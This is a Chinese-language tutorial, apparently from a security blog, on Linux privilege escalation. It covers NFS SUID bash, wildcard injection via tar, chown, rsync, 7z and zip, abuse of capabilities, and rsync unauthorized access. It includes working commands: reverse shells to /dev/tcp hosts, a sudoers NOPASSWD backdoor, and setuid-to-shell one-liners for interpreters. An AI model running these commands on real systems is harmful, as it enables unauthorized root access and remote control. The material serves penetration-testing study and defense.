+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543459.png" alt><br>
+有了共享中的 bash 文件，接下来我们需要回到攻击者机器上，将文件的所有权更改为 root 并授予它 SUID 权限。</p>
+<pre><code class="hljs bash"><span class="hljs-built_in">chown</span> root:root /mnt/share/bash
+<span class="hljs-built_in">chmod</span> +s /mnt/share/bash</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543460.png" alt><br>
+我们将所有权从 kali:kali 切换到 root:root，然后授予二进制 SUID 权限。</p>
+<blockquote>
+<p>二进制文件的 所有者/组 之所以显示为攻击者机器上的 kali:kali，是因为受害者机器上的用户 juggernaut 的 uid 正好同攻击者机器上的用户 kali 的 uid 相同。</p>
+</blockquote>
+<p>最后，我们只需要再次返回受害者 SSH 会话，然后执行二进制文件，我们就应该进入了 root shell。<br>
+从受害者的角度来看，一切看起来都很好。<br>
+<code>/share/bash -p</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543461.png" alt></p>
+<h2 id="通配符注入提权">通配符注入提权</h2>
+<p>简单复习通配符相关知识：<br>
+在LINUX中通配符可以被用来模糊匹配，而且通配符的输入是由当前用户的shell去进行解析</p>
+<pre><code class="hljs c">* 代表任意数量的字符
+
+? 字符代表单个字符
+
+[] 匹配中括号中的任意单一字符 可以使用连字符-表示范围，比如[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]</code></pre>
+<p>接下来看一下什么是Wildcard wildness简称WS，我们先创建3个文件<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543462.png" alt><br>
+接下来查看文件里面的内容，发现文件1和文件2都可以查看，但是–help查看不了，直接调出了–help的命令，这种类型的技巧称为Wildcard wildness。<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543463.png" alt><br>
+这时如果我们执行 ls * 那么就会执行 ls --help</p>
+<h3 id="tar-提权">Tar 提权</h3>
+<p>如何利用这一点进行提权呢：如果有的命令的参数中可以去执行linux命令，我们进行劫持，达到提权的目的，我们以tar命令为例子。<br>
+tar命令是Linux中的压缩命令，可以对文件进行压缩<br>
+<code>tar -czf html.tgz 1.html #将文件1.html文件压缩成html.tgz</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543464.png" alt><br>
+也可以使用通配符进行压缩<br>
+<code>tar -czf html.tgz *.html #将文件所有html文件压缩成html.tgz</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543465.png" alt><br>
+在tar中有执行linux命令的参数如下</p>
+<pre><code class="hljs bash">tar -czf 1.tgz 1.html --checkpoint=1 --checkpoint-action=<span class="hljs-built_in">exec</span>=<span class="hljs-built_in">whoami</span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543466.png" alt><br>
+可以对后面的命令进行劫持 ,只需要要编写一个这样的参数文件就行可以了</p>
+<pre><code class="hljs scss">echo " " &gt; <span class="hljs-attr">--checkpoint</span>=<span class="hljs-number">1</span>
+echo " " &gt; <span class="hljs-attr">--checkpoint-action</span>=exec=whoami
+
+<span class="hljs-comment">//原理：`--checkpoint`规定了写入几个记录之后设置检查点，`--checkpoint-exec`规定了执行的外部命令</span>
+
+<span class="hljs-comment">//这里的‘–checkpoint-action’选项，用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，选项‘–checkpoint=1’ 和 ‘–checkpoint-action=exec=sh shell.sh’作为命令行选项交给了tar程序。</span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543467.png" alt><br>
+接着运行&nbsp;<code>tar -czf html.tgz *</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543468.png" alt><br>
+遇到的场景举如下例子（网上文章)：<br>
+一般都有备份网站的习惯，那么运维人员或管理员填写了备份文件的计划任务任务，如果滥用了通配符，就可能导致提权</p>
+<pre><code class="hljs bash">*/1 * * * * root tar -cvf /var/html.tgz /var/www/html/ *</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543469.png" alt><br>
+在/var/www/html下创建两个文件如下</p>
+<pre><code class="hljs c">echo <span class="hljs-string">" "</span> &gt; /var/www/html/--checkpoint=<span class="hljs-number">1</span>
+echo <span class="hljs-string">" "</span> &gt; /var/www/html/--checkpoint-action=exec=<span class="hljs-string">'bash shell.sh'</span>
+echo <span class="hljs-string">"bash -i &gt;&amp; /dev/tcp/192.168.41.211/8888 0&gt;&amp;1"</span> &gt;&gt; /var/www/html/shell.sh</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543470.png" alt><br>
+当执行tar 命令时，通配符* 会自动被替换成参数，完整的命令就成下面<br>
+<code>tar -zcf /var/html.tgz * --checkpoint=1 --checkpoint-action=exec=sh shell.sh</code></p>
+<p>tar提权更多操作：</p>
+<ol>
+<li>可以将某个用户添加到sudoers中，从而无密码执行root可执行的命令<br>
+<code>echo 'echo "test ALL=(ALL)NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; shell.sh</code></li>
+<li>可以给可进行suid提权的二进制文件赋予suid权限</li>
+</ol>
+<pre><code class="hljs scss">echo "chmod u+s /usr/bin/find" &gt; test<span class="hljs-selector-class">.sh</span>
+echo "" &gt; "<span class="hljs-attr">--checkpoint-action</span>=exec=sh test<span class="hljs-selector-class">.sh</span>"
+echo "" &gt; <span class="hljs-attr">--checkpoint</span>=<span class="hljs-number">1</span>
+tar cf archive<span class="hljs-selector-class">.tar</span> *
+find f1 -exec "whoami" \;
+find f1 -exec "/bin/sh" \;</code></pre>
+<h3 id="chmodampchown-提权">chmod&amp;chown 提权</h3>
+<blockquote>
+<p>Linux/Unix 是多用户多任务操作系统，所有的文件皆有其拥有者（Owner）。利用 chown命令 可以将文件的拥有者加以改变。一般来说，这个命令只能由系统管理者(root)使用，一般用户没有权限来改变别人的文件的拥有者，也没有权限可以将自己的文件的拥有者改设为别人。只有系统管理者(root)才有这样的权限。</p>
+</blockquote>
+<p>示例如下：</p>
+<ul>
+<li>超级管理员用户 (root) - 执行管理级任务，例如执行chown命令。</li>
+<li>非root用户1（raj） - 执行普通任务，如创建文件</li>
+<li>非root用户2（aarti） - 执行普通任务，如创建文件</li>
+<li>恶意用户（Ignite） - 执行可导致文件所有者劫持的Chown文件引用技巧等任务。<br>
+在下图中你可以看到，所有PHP文件的所有者均为“raj”用户。此时用户ignite可以在同一目录中执行以下命令，使用文件引用技巧来劫持文件所有者。</li>
+</ul>
+<p><strong>–reference=&lt;参考文件或目录&gt;：</strong> 把指定文件或目录的所有者与所属组，统统设置成和参考文件或目录的所有者与所属组相同。</p>
+<pre><code class="hljs scss">cd
+ls -al
+echo "" &gt; my<span class="hljs-selector-class">.php</span>
+echo &gt; <span class="hljs-attr">--reference</span>=my<span class="hljs-selector-class">.php</span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543471.png" alt></p>
+<p>当root用户使用通配符修改所有PHP文件所有权时，ignite用户将取得所有文件间接所有权。</p>
+<p>如果此时root用户执行chown将所有PHP的所有权赋予用户aarti时，将会发生错误,，ignite用户将自动获取所有PHP文件的所有权。</p>
+<pre><code class="hljs scss">chown -R aarti:aarti *.php
+ls -al</code></pre>
+<p>在本文的例子中用户ignite执行以下命令：</p>
+<pre><code class="hljs scss">echo "" &gt; my<span class="hljs-selector-class">.php</span>
+echo &gt; <span class="hljs-attr">--reference</span>=my<span class="hljs-selector-class">.php</span></code></pre>
+<p>然后，root用户通过通配符来修改文件所有权。chown命令行采用了主观的’-reference = .my.php’文件，并将其作为选项传递给命令行中的chown命令。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543472.png" alt></p>
+<h3 id="rsync提权">Rsync提权</h3>
+<blockquote>
+<p>rsync命令是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。rsync使用所谓的“rsync算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。</p>
+</blockquote>
+<p><code>rsync</code>命令同样有比较有意思的参数：<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543473.png" alt></p>
+<p>创建一个向<code>/etc/passwd</code>中写入内容的shel脚本，这里只是写了一个’test’，在实际中你可以尝试写入一个id为0的用户，这样就相当于写入一个root权限的用户</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543474.png" alt></p>
+<p>使用root来执行<code>rsync</code>，注意这里<code>-a</code>参数后也不能使用绝对路径，执行之后发现<code>/etc/passwd</code>已经被写入内容了</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543475.png" alt></p>
+<h3 id="7z-提权">7z 提权</h3>
+<p>在 <strong>7z</strong> 中，即使在 <code>*</code> 之前使用 <code>--</code>（注意 <code>--</code> 意味着后续输入不能被视为参数，因此在这种情况下只是文件路径），您也可以导致任意错误以读取文件，因此如果以下命令由 root 执行：</p>
+<pre><code class="hljs scss"><span class="hljs-number">7</span>za <span class="hljs-selector-tag">a</span> /backup/<span class="hljs-variable">$filename</span><span class="hljs-selector-class">.zip</span> -t7z -snl -<span class="hljs-selector-tag">p</span><span class="hljs-variable">$pass</span> -- *</code></pre>
+<p>而且您可以在执行此操作的文件夹中创建文件，您可以创建文件 <code>@root.txt</code> 和文件 <code>root.txt</code>，后者是您想要读取的文件的 <strong>symlink</strong>：</p>
+<pre><code class="hljs scss">cd /path/to/<span class="hljs-number">7</span>z/acting/folder
+touch <span class="hljs-keyword">@root</span>.txt
+ln -s /file/you/want/to/read root.txt</code></pre>
+<p>然后，当 <strong>7z</strong> 执行时，它会将 <code>root.txt</code> 视为一个包含它应该压缩的文件列表的文件（这就是 <code>@root.txt</code> 存在的意义），当 7z 读取 <code>root.txt</code> 时，它会读取 <code>/file/you/want/to/read</code>，<strong>由于该文件的内容不是文件列表，它将抛出一个错误</strong> 显示内容。</p>
+<h3 id="zip-提权">Zip 提权</h3>
+<p><strong>执行任意命令：</strong></p>
+<pre><code class="hljs scss">zip name<span class="hljs-selector-class">.zip</span> files -T <span class="hljs-attr">--unzip-command</span> "sh -c whoami"</code></pre>
+<h2 id="capabilities提权">Capabilities提权</h2>
+<blockquote>
+<p>Linux 2.2以后增加了capabilities的概念，可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的；在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题，我们可以在<a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities(7) - Linux manual page</a>中看到这些特权的说明。</p>
+</blockquote>
+<p>系统管理员可以用来提高进程或二进制文件的权限级别的另一种方法是“功能”。功能有助于更精细地管理权限。例如，如果 SOC 分析师需要使用需要启动套接字连接的工具，普通用户将无法做到这一点。如果系统管理员不想授予该用户更高的权限，他们可以更改二进制文件的功能。因此，二进制文件无需更高权限的用户即可完成其任务。</p>
+<p>功能手册页提供了有关其用法和选项的详细信息，我们可以使用 <code>getcap</code> 工具列出启用的功能。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240212141357152.png" alt="image-20240212141357152"></p>
+<p>当以非特权用户身份运行时， <code>getcap -r /</code> 将生成大量错误，因此最好将错误消息重定向到 /dev/null。</p>
+<p>请注意，vim 及其副本都没有设置 SUID 位。因此，在枚举文件以查找 SUID 时，无法发现此权限升级向量。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240212141459472.png" alt="image-20240212141459472"></p>
+<p>GTFObins 有一个很好的二进制文件列表，如果我们发现任何设置的功能，可以利用这些二进制文件进行权限升级。</p>
+<p>我们注意到 vim 可以与以下命令和负载一起使用：</p>
+<p>似乎是只有设置为<code>setcap cap_setuid+ep vim</code>才可以</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240212141823578.png" alt="image-20240212141823578"></p>
+<pre><code class="hljs scss">./vim -c ':py3 import os; os<span class="hljs-selector-class">.setuid</span>(<span class="hljs-number">0</span>); os<span class="hljs-selector-class">.execl</span>("/bin/sh", "sh", "-c", "reset; exec sh")'</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240212142933208.png" alt="image-20240212142933208"></p>
+<p>利用命令提权，可以参考<a target="_blank" rel="noopener" href="https://gtfobins.github.io/#+capabilities">GTFOBins</a>（有些命令不适合所有终端）</p>
+<pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">gbd的利用方法</span>
+./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_">#</span><span class="language-bash">node的利用方法</span>
+./node -e 'process.setuid(0); child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_">#</span><span class="language-bash">perl的利用方法</span>
+./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_">#</span><span class="language-bash">php的利用方法</span>
+./php -r "posix_setuid(0); system('/bin/sh');"
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_">#</span><span class="language-bash">pythond的利用方法</span>
+./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_">#</span><span class="language-bash">ruby的利用方法</span>
+./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_">#</span><span class="language-bash">rview的利用方法</span>
+./rview -c ':lua os.execute("reset; exec sh")'
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_">#</span><span class="language-bash">rvim的利用方法</span>
+./rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_">#</span><span class="language-bash">view的利用方法</span>
+./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_">#</span><span class="language-bash">vim的利用方法</span>
+./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_">#</span><span class="language-bash">vimdiff的利用方法</span>
+./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</code></pre>
+<h2 id="rsync未授权访问提权">Rsync未授权访问提权</h2>
+<p>介绍：Rsync是linux下一款数据备份工具，默认开启873端口。<br>
+如果想要实验，可以去vulhub搭建。案例如下：</p>
+<p>比如我们实战中nmap扫出rsync的端口：873<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543476.png" alt></p>
+<p>下一步做的是：我们先列出模板，以及该模板下的文件</p>
+<pre><code class="hljs css">rsync rsync://目标ip:<span class="hljs-number">873</span>/
+rsync rsync://目标ip:<span class="hljs-number">873</span>/  列出模块src下的文件</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543477.png" alt><br>
+随后尝试下载：rsync下的配置文件/etc/rsynd.conf到本机的/root/1.conf</p>
+<pre><code class="hljs scss">rsync -av rsync://目标ip:<span class="hljs-number">873</span>/src/etc/rsyncd.conf /root/<span class="hljs-number">1</span>.conf
+//-v 打印更多的信息  
+//-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543478.png" alt><br>
+接下来准备一个提权的shell文件：</p>
+<pre><code class="hljs scss">#!/bin/bash
+/bin/bash -<span class="hljs-selector-tag">i</span> &gt;&amp; /dev/tcp/ip/port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre>
+<p>赋予执行权限：<code>chomd +x shell</code>，上传文件到定时任务目录下<br>
+<code>rsync -av shell rsync://ip:port/src/etc/cron.hourly</code><br>
+进行nc 监听相应的端口。<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543479.png" alt></p>
+<p>不过需要注意的是：</p>
+<p>ubuntu的定时任务默认文件：</p>
+<pre><code class="hljs scss">SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+ 
+# m h dom mon dow user	command
+<span class="hljs-number">17</span> *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+<span class="hljs-number">25</span> <span class="hljs-number">6</span>	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+<span class="hljs-number">47</span> <span class="hljs-number">6</span>	* * <span class="hljs-number">7</span>	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+<span class="hljs-number">52</span> <span class="hljs-number">6</span>	<span class="hljs-number">1</span> * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#</code></pre>
+<p><code>17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly</code>意思是：每小时的第17分钟执行run-parts --report /etc/cron.hourly命令</p>
+<h2 id="共享库劫持提权">共享库劫持提权</h2>
+<blockquote>
+<p>Linux 程序通常使用动态链接的共享对象库。库包含已编译的代码或开发人员用来避免跨多个程序重写相同的代码段的其他数据。Linux 中存在两种类型的库：（<code>static libraries</code>由 .a 文件扩展名表示）和<code>dynamically linked shared object libraries</code>（由 .so 文件扩展名表示）。编译程序时，静态库成为程序的一部分，无法更改。但是，可以修改动态库以控制调用它们的程序的执行。</p>
+<p>有多种方法可以指定动态库的位置，因此系统将知道在程序执行时在哪里查找它们。这包括编译程序时的<code>-rpath</code>or<code>-rpath-link</code>标志，使用环境变量<code>LD_RUN_PATH</code>or&nbsp;<code>LD_LIBRARY_PATH</code>，将库放置在<code>/lib</code>or<code>/usr/lib</code>默认目录中，或者在<code>/etc/ld.so.conf</code>配置文件中指定包含库的另一个目录。</p>
+<p>此外，<code>LD_PRELOAD</code>环境变量可以在执行二进制文件之前加载库。此库中的函数优先于默认函数。</p>
+</blockquote>
+<p>查看二进制文件所需要的动态共享链接库：ldd<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543480.png" alt></p>
